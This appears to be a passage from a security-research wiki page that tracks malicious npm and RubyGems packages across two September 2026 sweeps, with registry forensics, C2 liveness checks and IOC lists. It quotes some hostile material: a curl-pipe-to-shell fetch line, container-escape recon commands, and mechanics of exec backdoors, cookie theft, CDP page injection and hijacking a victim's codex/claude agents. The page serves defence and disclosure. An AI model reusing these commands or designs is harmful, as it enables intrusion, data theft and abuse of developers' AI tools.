- **`16444` + `16445` `n8n-nodes-healthmon` / `n8n-nodes-metricsagent` 1.0.0 — a two-name backdoor pair in the n8n-community-node costume sharing one listener grammar:** postinstall `require('./index.js')` starts `http.createServer(...).listen(41111, '0.0.0.0')`, JSON body field `c` goes straight to `child_process.exec` (metricsagent adds a 30-s timeout and returns stdout/stderr), no auth, no loopback bind — any host that can reach TCP 41111 owns the installing user; the node's own `dist/*.node.js` reinstalls the listener on every n8n start, and `metricsagent`'s default 'Command' parameter is container-escape recon (`id; hostname; grep Cap /proc/self/status; ls /var/run/docker.sock`) under a 'Health Monitor' label. **This wiki's registry forensics: both names died BEFORE the advisory — healthmon lived 16 h (created Sep 15 00:39 UTC, unpublished 16:46 UTC), metricsagent 7 h (Sep 16 13:41 → 20:47 UTC), delete-only with surviving `unpublished` time blocks = names re-registerable.** Same stream window as `n8n-nodes-data-transformer-utils` (16418, still LIVE with its raw-IP C2 at this wiki's recheck, 1.0.0 unchanged 19:32 UTC): the n8n-node namespace is now a confirmed costume class with three packages in ~24 h of advisories — and the `0.0.0.0:41111` + `c`-field-to-exec signature shared by two independently-named packages is a template key.
- **`16443` `my-company-device` 0.1.0/0.1.1 — the persistence design that weaponizes the victim's own AI coding agents.** `npx my-company-device` appends a hardcoded `ssh-ed25519` key labelled **`sunyiting-macmini`** to `~/.ssh/authorized_keys` (0600) — with macOS Remote Login + **Tailscale** required = SSH over the private mesh, no exposed ports — and installs `~/.my-company-device/scripts/device-worker.mjs`, which reads a JSON request from stdin and **spawns `codex` or `claude` with caller-supplied argv, cwd, and env**, base64-encoding any `result.md` back out on stdout. The allowed-roots whitelist comes from the INCOMING request, not the worker = the private-key holder gets persistent remote shell + arbitrary coding-agent execution + file read-back; the authorized_keys entry and worker survive package uninstall. **This wiki: package LIVE (created Aug 28, both versions same 40-second window, maintainer `ksana0 <yiting_sun@icloud.com>`) — live 26 days before the advisory, zero GHSA at check.** Durable class: agent dispatch is becoming the payload — the operator doesn't ship a RAT, it rents the victim's already-authenticated `codex`/`claude` sessions, whose egress is whitelisted and whose activity looks like the developer working.
- **`16441` + `16442` `moidevl` / `moudeva` 1.0.0 — one operator across two stripped names, both pointing at the same dead endpoint `https://ipc.shadxino.internal`.** `moidevl` (README: "Windows diagnostic utility") is an **anti-proctoring exam-cheating overlay** for Safe Exam Browser / AMCAT: Electron window hidden from screen capture via `SetWindowDisplayAffinity(WDA_EXCLUDEFROMCAPTURE)` + `WS_EX_TOOLWINDOW/NOACTIVATE`, process renamed **`SearchApp.exe`** (Windows Search masquerade), a 'Ghost Watchdog' that immortally respawns it with backoff logging to `%LOCALAPPDATA%\Microsoft\Windows\Diagnostics\boot.log`, a `chrome_cookies.ps1` that copies locked Chrome/Edge/Brave Cookie DBs, DPAPI-unwraps the `os_crypt` key and AES-256-GCM-decrypts cookies **for openai.com/chatgpt.com/auth0.openai.com/auth.openai.com**, then injects them into an embedded Electron session to drive those AI services under the browser owner's identity; it screenshots + UI-Automation-extracts the foreground exam window and POSTs to `ipc.shadxino.internal`, ships a 27 MB opaque `bin/uia_extract.exe` beside its Python source. `moudeva` is the same endpoint + child_process shape stripped down. **Registry forensics: `moidevl` LIVE since Sep 1 (22 days, maintainer `vip1234 <heyprogrammertoshan@gmail.com>`); `moudeva` self-deleted the same day it was created (Sep 4, 13:13→18:27 UTC).** The `.internal` TLD is not publicly registrable — the exfil target resolves only inside a controller's network, i.e. the collector is either gone or was never live. Cheating-tool-as-trojan-horse: the AI-account cookie theft is the supply-chain-relevant half, and `.internal` endpoints in shipped code are a static-hunt tell.
- **`16434`–`16437` — a four-name `webhook.site` + `dnshook.site` dependency-confusion probe fleet, two publishers:** `catplatebarcodeparser` + `catqrcodeconverter` 99.2.1 (same-minute creation Sep 22 11:04/11:08 UTC, both **deleted 17:47:07/17:47:08 UTC — one second apart**, `cat`-prefix name grammar, per-name webhook UUIDs + `<uuid>.dnshook.site` DNS canaries, `99.2.1` = internal-package-beating version shape) and `efhthrthrthregerht` + `eslint-plugin-i18n-shreddit` 99.9.9 — **both published by `alrwsy1 <xxmsm75@gmail.com>` AND beaconing to the SAME webhook.site UUID `f9bff304-3053-4d54-be05-86537267514a`** (keyboard-mash name + fake ESLint plugin with zero plugin code, postinstall POSTs username/cwd/hostname/local-IPv4). The two `alrwsy1` names are LIVE at check; the `cat*` pair is delete-only. Fleet reads as target-qualification (who has an internal package by this name) rather than payload delivery — same posture as the Telegram chat-ID fleet, different rails (webhook.site instead of Telegram, `dnshook.site` instead of `dc-callback`).
- **`16438` + `16439` `internallib_v497` / `internallib_v550` — dependency-confusion bait that admits itself:** names shaped like private internal libs, `internallib_v497@1.0.3` exports `command()` → `curl http://10.0.5.109/shell.sh | sh` (**payload URL is a PRIVATE RFC1918 address** — the C2 only exists inside some network, likely a lab/engagement artifact) and self-declares its own name as a `^1.0.0` dependency (classic resolution-bait doubling); `internallib_v550@1.0.1` package.json description is literally **`pwn`**, payload is `id` + a console `infected` print — call-only, not install-time. **`gabrie0x6c <gabriel.alvescybersec@gmail.com>` (self-described cybersec) published v497 (LIVE at check); v550 self-deleted Sep 21 after 30 minutes, and its registry `time` block shows it carried versions 1.0.1 AND 1.0.3 while the OSV record only saw 1.0.1 = the name iterated twice pre-advisory.** PROBABLY-pentest-shaped artifacts (private-IP C2, `pwn` self-label, `id` payload) but filed under the standing rule: self-declared benign labels are untrusted metadata — a `pwn` label is also exactly what a qualification probe wears.
- **`16440` `turbo-ws` 1.0.0 — the third live sighting of the git-tarball dependency rail** (after the `github:`-spec Baileys trio): sole dependency `node-net-pool` declared as `https://github.com/trktgq0wbre1/node-net-pool/archive/refs/heads/main.tar.gz` — whatever bytes that branch serves TODAY install-and-`require()`-execute on every installer, no pin, no integrity, while the package description advertises 'zero dependencies' (manifest lies about its own dependency list = static-hunt tell) and the declared repo `turbo-ws-dev/turbo-ws` is unrelated to the fetch account. **This wiki: package LIVE (maintainer `ozturkjs <ozturkdev@limbomail.com>`) and the referenced GitHub repo resolves HTTP 200 at check — whoever holds `trktgq0wbre1` owns every future installer.**

Survivor and cluster-state pass (twenty-third):

- **`@insiderintelligence/googleadmanager` remains 404** (check ~03:30 UTC Sep 23, second sweep since the flip) — **still NO `0.0.1-security` holder = positive artifact absent, takedown NOT confirmed**, second consecutive sweep under the bare-404 rule. The other survivors checked this pass are all live and byte-identical: five `@tvg-mar/*` (9.9.10, timestamps 13:54–18:39 UTC unchanged), `n8n-nodes-data-transformer-utils` (1.0.0, 19:32 UTC), `@baanx/abis` (200, 9.9.11 — registry fault-window rule holds, no recurrence).
- **`@gsutevil/hta-ui` STILL LIVE** (re-pull ~03:30 UTC: 200, tarball 156,665 b byte-identical to the Sep 23 first-sweep pull, maintainer still `cryptodomespag`) — the Banco do Brasil fraud UI takedown watch continues into day one; `@gsutevil/hta-stage` tarball still 404 (holder state unchanged).
- **C2 re-probes: `npmjs.it.com` register route still 400 `invalid agent_id` (agent infra up, ~7 days old); `193.149.176.186:8888` still TCP-OPEN** (second consecutive sweep, >8 h post-GHSA); `cbrsuo9293.execute-api…/c` GET still **200** (route outlives the deleted package a third sweep running) though its POST now 404s (integration-side change worth one more check).
- `@wizloft/harness` base name still `0.0.1-security` holder (no operator re-registration); npm search shows zero live `@gsutevil/*` / `@wizloft/*` versions beyond what's recorded.

**KEV:** unchanged 2026.09.22 / 1,721 at ~03:25 UTC Sep 23 (catalog JSON re-pulled; Sep 25 due dates one weekend away; lag queue: Veeam CVE-2026-32996 + kernel trio).

**Feeds:** Unit 42 latest Sep 21 (IAM lockdown, below bar, unchanged); Wiz latest Sep 22 12:00 GMT product post (below bar); Sonatype latest Sep 22 marketplace-award post (below bar); JFrog research feed 404 (endpoint moved, page watch unchanged); Socket CF-403, Akamai 403, MSFT block persist; no Shai-Hulud / Mini Shai-Hulud / TeamPCP follow-up in any checked stream.

## <a id="september-23-twenty-fourth-sweep"></a>September 23 twenty-fourth sweep (~05:15–06:00 UTC): OSV moves an EIGHTH time in ~48 hours — 27 records (16446–16472) in two waves — headline is the stream's first **local-Chrome-DevTools-Protocol hijacker family** (`godxxx`/`godzz`/`godzzz`, one Cloudflare Worker collecting page scrapes, still POST-ready at check) plus TWO LIVE packages carrying opaque binaries and open C2 (`hachutis` 455 dl/wk with an embedded trycloudflare tunnel, `helpersutils-dev-tools` 193 dl/wk beaconing to a live raw IP)

**OSV sweep (direct-ID, resume 16446): 27 new records 16446–16472, then 16473–16480 empty. High-water now MAL-2026-16472, resume 16473.** Eighth stream move in ~48 hours. The batch arrived in two structurally different waves:

- **Wave 1 (16446–16460, 15 records): ghsa-malware origin — the inverse of the last three sweeps.** Every one of the fifteen carries a GHSA alias at import (GHSA-r4h9-57fh-5fj3 … GHSA-6g8g-gw7h-prch, all severity critical, published 02:44:19 / 02:48:05 / 03:07:33 UTC in three scripted timestamp groups) and every one is an **already-holder-created name**: this wiki pulled all fifteen registry docs — each is `0.0.1-security` created by npm 02:42–03:07 UTC Sep 23, with per-version timestamps in the `time` block as the only surviving artifact. Two name-grammars inside the wave: **(a) keyboard-walk gibberish cluster** — `caphsmgiwy`, `kamafhbnowct`, `luftzxyuiwgbgsp`, `mob4zchvuine`, `tib2jcvowuyma`, `tibcwmpoeafh`, `tuxcmdfhjkw`, `xsjukcnv8low26` — all created inside clustered per-pair second-windows: 1.0.0/1.0.1 creations seconds apart per pair (Sep 2: 07:04/10:04/03:23, Sep 3: 06:39/02:49, Sep 14: 02:05/04:33, Sep 10: 03:49/06:25) = the same disposable-name generator grammar as the nineteenth-sweep GHSA-bot batch (`fdhcxvnwhjiofv`, `kambxjowhdsgyw`, …), now with advisories. **(b) utility-name squats with a shared backdated-creation signature**: `better-md` 99.0.0, `some-tool-package` 99.0.0, `debounce-throttle-base` 1.0.0, `iso-datetime-core` 1.0.0, `semver-bump-io` 1.0.0, `solo-async-pipe` 1.0.0, `webp-https-errors` 1.0.0+4.7.2 — **five of seven share version-creation timestamps inside NINE SECONDS (2026-05-14 15:02:10 → 15:02:30 UTC)**, one more with 15:04-15:05 = one scripted registration batch six weeks before this advisory, `99.0.0` shapes = dependency-confusion qualification versions. Content unknowable (versions purged, GHSA text is the standard full-compromise boilerplate); recorded as pipeline/stream state + the nine-second batch-registration tell as a durable forensic key for future co-registration claims.
- **Wave 2 (16461–16472): the live-artifact wave.**
  - **`16461`/`16462`/`16463` `godxxx` / `godzz` / `godzzz` 1.0.0 — the npm malware stream's first Chrome DevTools Protocol hijacker family, three names one operator.** Per Amazon Inspector's three analyses (full text captured in OSV): `cdp_inject.js` is the package MAIN and **runs unconditionally at require time** — polls `http://127.0.0.1:9222/json` for Chrome DevTools targets, attaches over CDP, **injects a script into every open page** that scrapes `document.body.innerText` + the active editor's contents, base64-encodes, POSTs to hardcoded `https://ai-script.test0ing7.workers.dev` (author-operated Cloudflare Worker, not caller-configurable). The module sets `process.env.NODE_TLS_REJECT_UNAUTHORIZED='0'` at load = **disables TLS certificate validation for the entire Node process**, ships a live-looking third-party **Groq API key (`gsk_…`) in cleartext in an in-source `keyPool`**, and `godxxx`'s `--stop` mode shells out to `taskkill /F /IM node.exe` — killing every Node process on the machine, not just the tool. Name grammar `god` + n×`x/z` = same-keyboard key-mashing as wave 1's cluster (a) but a completely different artifact. **This wiki: all three names deleted before advising — created Sep 7-8 (godzz 06:42, godxxx 06:49:11, godzzz 06:50:18 UTC, the last two 67 seconds apart), unpublished 09:35 UTC the same day (~2.5-3 h lives, delete-only with surviving `unpublished` blocks, no holder, 0 downloads).** **The collection endpoint is still alive: `ai-script.test0ing7.workers.dev` answers GET 200 / POST 500 at this wiki's check ~05:45 UTC Sep 23** = deployed, POST-ready, a month-old-ish worker outliving all three packages (the standing serverless-C2-outlives-the-package finding, now on Cloudflare Workers; `test0ing7` subdomain is the durable pivot). Durable class note: this is **attacker-side browser automation** — the devtools-port trust boundary (`--remote-debugging-port` exposes the whole browser to anything on localhost) is the vulnerability; the packages merely enumerate it.
  - **`16464` `hachutis` 1.0.0→1.0.6 — LIVE, 455 downloads/week, and the most dangerous artifact of the sweep.** Amazon Inspector full text: tarball ships **three undeclared prebuilt executables** under `bin/` (`bin/cli`, `bin/cli-linux-amd64`, and an **81 MB Bun-compiled `bin/cli-http-linux`**) NOT exposed via `package.json.bin`; the only declared bin `hatcher-env` points at `bin/cli.js` **which is absent from the tarball**; declared main `src/index.js` is an unrelated dotenv-style parser hardcoded to `/home/hatch/test.dat` with no reference to the shipped binaries; the readable JS region of `bin/cli-http-linux` **embeds the live-format Cloudflare Tunnel hostname `already-query-bacteria-agreed.trycloudflare.com` adjacent to HTTP POST verbs**; and the README instructs the installer to **run one of the `./bin/` binaries at least once to "activate the package in our systems."** = a native-binary activation-instruction social rail around an opaque 81 MB payload whose real behavior is undocumented; the JS is the decoy. **This wiki: package LIVE (maintainer `corraldev-machine <hello@corraldev.com>`, "CLI utility", seven versions Sep 11-16, zero GHSA at check), 455 dl/week last week.** The embedded tunnel hostname does NOT resolve at check (free tunnels die with the origin process — the operator's side was down, the binary will open a new one on any victim host on demand). Takedown watch opened.
  - **`16465` `helpersutils-dev-tools` 1.0.0→1.0.18 — LIVE, 193 downloads/week.** Require-time IIFE issues an `Image` request to `http://5.189.173.113:8899/csp-edu` with `document.domain` appended (browser-shaped beaconing inside an npm package), sibling `bypass.js` carries the twin beacon to `/csp`; plain HTTP to a hardcoded bare IP. **This wiki: `5.189.173.113:8899` TCP-OPEN at check ~05:45 UTC.** Maintainer `yess321 <bugbountykiller@outlook.com>` — the `<anything>killer@` bug-bounty-signature email grammar echoes PhantomRaven's self-labeled-hunter posture and the `betfairpoc@`/`vd_danilov` canary accounts; eighteen versions in 14 hours on Sep 2-3 = scripted iteration. Zero GHSA at check, takedown watch opened.
  - **`16466` `wurl_show_data` 3.1.42.99 — RubyGems, OpenSSF-flagged.** This wiki's RubyGems API pull: author `izz00`, 507 downloads, summary literally **`a POC:)`**, homepage `dependency-confusion-test.oob.izz.lol` = an attacker-family-style OOB domain naming its own purpose (same target-qualification posture as this page's Telegram/webhook.site dependency-confusion probe fleets, first on-wiki RubyGems instance of the class, third registry after npm/PyPI); inflated `3.1.42.99` version = qualification shape; npm-side name 404 = registry-divergence data point (kerokwis pattern). Created Sep 22 21:21 UTC.
  - **`16467`–`16472` — a six-name backlog drain**: `@test1230504/probe-7f3k2m-utils`, `@test1230504/string-format-helper`, `@test1230504/test-publish-verify` (scope names screaming test-publish probes, 1.0.0s from Jul 28, holder-created by `npm-support` 05:08-05:09 UTC with GHSA mirrors inside a minute) + `z-deno-truth-bwhlsz`/`va499w`/`ya1t4m` (1.0.0s from Jul 24, holder-created 05:07 UTC, GHSA-mirrored) = the months-late holder-wave pattern (ViteVenom July backlog precedent) catching July-era test/probe names, with a `z-` prefix + random suffix name grammar worth noting. Below bar individually; stream state.

**Survivor and cluster-state pass (twenty-fourth):**

- **STATE CHANGE — the `turbo-ws` git-tarball rail is BROKEN at the source:** the referenced GitHub account's repo fetch `github.com/trktgq0wbre1/node-net-pool/archive/refs/heads/main.tar.gz` now redirects to **HTTP 404** (user still exists, HTTP 200 — the repo specifically is gone/deleted at this wiki's check ~05:50 UTC, one sweep after we recorded repo HTTP 200). `turbo-ws` itself remains LIVE (1.0.0, `ozturkjs`) so new installs now FAIL resolution rather than fetching attacker-controlled bytes — a dead rail, not a neutralized package (name still installable if the dep is ever restored).
- **`@gsutevil/hta-ui` STILL LIVE into day two** (re-pull ~05:40 UTC: 1.62.0 still `latest`, Banco do Brasil fraud UI downloadable); `gsut.com/v1/hta/event` still answers 200.
- **`npmjs.it.com` C2 now fronts HTTPS and still speaks:** HTTP GET redirects 301 (nginx/1.24.0 Ubuntu banner) and `https://npmjs.it.com/api/register` POST still returns **400 `invalid agent_id`** — agent infra live ~7.5 days on, and the cert/HTTPS addition since last sweep suggests the operator kept maintaining it.
- `@vitemirrorte` scope: no re-registration of `element-plus-vite-cli` (still 404, no holder). `googleadmanager` 404 THIRD consecutive sweep, still no `0.0.1-security` holder = NOT takedown, third sweep under the bare-404 rule. `moidevl` LIVE (1.0.0 unchanged, day 22), `my-company-device` LIVE (0.1.1 unchanged, day 26), `turbo-ws` LIVE, `n8n-nodes-data-transformer-utils` LIVE (1.0.0), `193.149.176.186:8888` still **TCP-OPEN (third consecutive sweep)**; `cbrsuo9293.execute-api…/` still GET 200. webhook.site UUID `f9bff304…` returns **429** (rate-limiting = route exists and is being hit, weakest live signal in the class, one more check scheduled). `@wizloft` no re-registration. `n8n-nodes-healthmon`/`metricsagent` names still delete-only, unheld.

**IOCs added:** `ai-script.test0ing7.workers.dev` (GET 200 / POST 500 at check — live CDP-scrape collector); `5.189.173.113:8899` (`/csp`, `/csp-edu`, TCP-OPEN); `already-query-bacteria-agreed.trycloudflare.com` (embedded, not resolving); `dependency-confusion-test.oob.izz.lol`; Groq API-key prefix `gsk_` in shipped `keyPool`; packages `godxxx`/`godzz`/`godzzz` (dead), `hachutis` 1.0.0-1.0.6 (LIVE), `helpersutils-dev-tools` 1.0.0-1.0.18 (LIVE), `wurl_show_data` 3.1.42.99 (RubyGems); npm accounts `corraldev-machine` (hello@corraldev.com), `yess321` (bugbountykiller@outlook.com), RubyGems author `izz00`; wave-1 GHSA set `GHSA-r4h9-57fh-5fj3, GHSA-35mc-7f44-62rg, GHSA-g9m6-qcpw-g96x, GHSA-fc7h-qf7q-qxw4, GHSA-j87m-pgqx-mpg5, GHSA-cppx-756q-g98p, GHSA-f232-pcw4-j7qg, GHSA-m877-5x7f-7r88, GHSA-j96p-xm58-6233, GHSA-55vw-cpj6-w7w8, GHSA-hqgj-c9q6-8qv8, GHSA-vcg8-c5h2-55w6, GHSA-67q5-w9wg-mvvv, GHSA-gmm9-q3gf-4hfr, GHSA-6g8g-gw7h-prch`.

**KEV:** unchanged 2026.09.22 / 1,721 at ~05:30 UTC Sep 23 (GitHub mirror JSON re-pulled; Sep 25 due dates less than two days away; lag queue: Veeam CVE-2026-32996 + kernel trio).

**Feeds:** Unit 42 latest Sep 21 (IAM lockdown explainer, below bar, unchanged); Wiz latest Sep 22 product post (below bar); Aikido new post Sep 23 01:30 UTC = Cyber Resilience Act commentary (product/policy, below bar); Sonatype latest Sep 22 below bar; JFrog research feed 404 (moved), page shows no new post at check; Socket CF-403, Akamai 403, MSFT block persist; no Shai-Hulud / Mini Shai-Hulud / TeamPCP follow-up in any checked stream.

## Monitoring

- Takedown of the surviving `@insiderintelligence/googleadmanager` (live through Sep 21 check, ~156 h) **and of new sixth member `@baanx/solana-lib`** (live at Sep 21 check; GHSA not yet visible for it — OSV-sourced only at capture). **Plus the five `@tvg-mar/*` names (all live at Sep 22 ~22:40 UTC) and `n8n-nodes-data-transformer-utils` (live, C2 open).**
- Takedown / disposition of `@pwaplatform/module-sso-integration` (live at Sep 20 check despite an open malware-class GHSA), whether T-Bank or npm confirms or denies the bug-bounty claim, and whether the `vd_danilov` / `sobaka-kusaka.ru` / `npm-canary` infrastructure shows up in other packages.
- Domain rotation away from `algamil7x.xyz` (new `oob.*` domains using the same label grammar).
- Whether a **second wave / payload** appears aimed at orgs that beaconed (this cluster's reconnaissance shape invites a follow-on targeted drop).
- Whether Amazon Inspector or others publish more packages sharing the `lib/<hexish>.js` + `module.constructor._load` lineage (cluster growth beyond five).
- Any vendor writeup (Socket, SafeDep, StepSecurity, Sonatype) naming the campaign or linking it to a known actor — **no attribution currently exists or is implied here**; the domain string hints at nothing we treat as evidence.

## Sources

- GitHub Advisories (Amazon Inspector-sourced): [GHSA-hvcc-qwg6-972c](https://github.com/advisories/GHSA-hvcc-qwg6-972c) (`@tink/tink-link-core`), [GHSA-vmr9-5w3x-4v98](https://github.com/advisories/GHSA-vmr9-5w3x-4v98) (`@shared-web/assets`), [GHSA-29f7-pqf4-c94j](https://github.com/advisories/GHSA-29f7-pqf4-c94j) (`@shared-web/utils`), [GHSA-g85c-jph7-8q4r](https://github.com/advisories/GHSA-g85c-jph7-8q4r) (`@shared-runtime/modules`), [GHSA-76rx-jxhm-vhww](https://github.com/advisories/GHSA-76rx-jxhm-vhww) (`@insiderintelligence/googleadmanager`), all published Sep 18, 2026.
- OSV mirrors: `MAL-2026-16292` (`@shared-web/utils`), `MAL-2026-16290` (`@insiderintelligence/googleadmanager`).
- npm registry live re-checks (this wiki, Sep 19–20, 2026): four names return `Not found`; `@insiderintelligence/googleadmanager` resolves with `dist-tags.latest = 9.9.10`, created `2026-09-18T14:11Z`, 2 versions.
- Sep 20 canary item: [GHSA-26h7-cmv3-wgv6](https://github.com/advisories/GHSA-26h7-cmv3-wgv6) / OSV `MAL-2026-16299` (OpenSSF Package Analysis) for `@pwaplatform/module-sso-integration`; both tarballs (99.0.0, 99.0.1) pulled and analyzed directly from the npm registry by this wiki on Sep 20, 2026; `sobaka-kusaka.ru` and the hardcoded `oastify.com` subdomain resolution verified by this wiki; the T-Bank bug-bounty authorization claim is the publisher's own README statement and is unverified from public data.
- Sep 20 (third sweep): OSV `MAL-2026-16299` merged state read directly from the `ossf/malicious-packages` repository (commits `61aa5005` / `4abb1831`, 17:37–17:39 UTC) including the folded-in Amazon Inspector per-version analyses `MAL-0000-amazon-inspector-3cecca23c77c98d7` and `MAL-0000-amazon-inspector-4f674867f67f5a84`; GHSA severity/range state from the advisories API; registry liveness + `scope:pwaplatform` search from registry.npmjs.org (this wiki, Sep 20 ~19:30 UTC).

## Related pages

- [WeaselBiscuit npm stealer cluster](../tools/weaselbiscuit-npm-stealer-beavertail-ottercookie-dprk-opensourcemalware-september-2026.md) — same week's npm campaign coverage; different design (import-time stealer vs DNS recon)
- [Mini Shai-Hulud npm/PyPI worm campaign](mini-shai-hulud-npm-pypi-worm-campaign.md) — the priority-watch propagation campaign this cluster is NOT linked to on current evidence
- [mathmain encrypted-loader npm trio](mathmain-encrypted-loader-npm-trojanised-mathjs-trio-safedep-september-2026.md) — the standing npm watch item; different lineage and mechanism
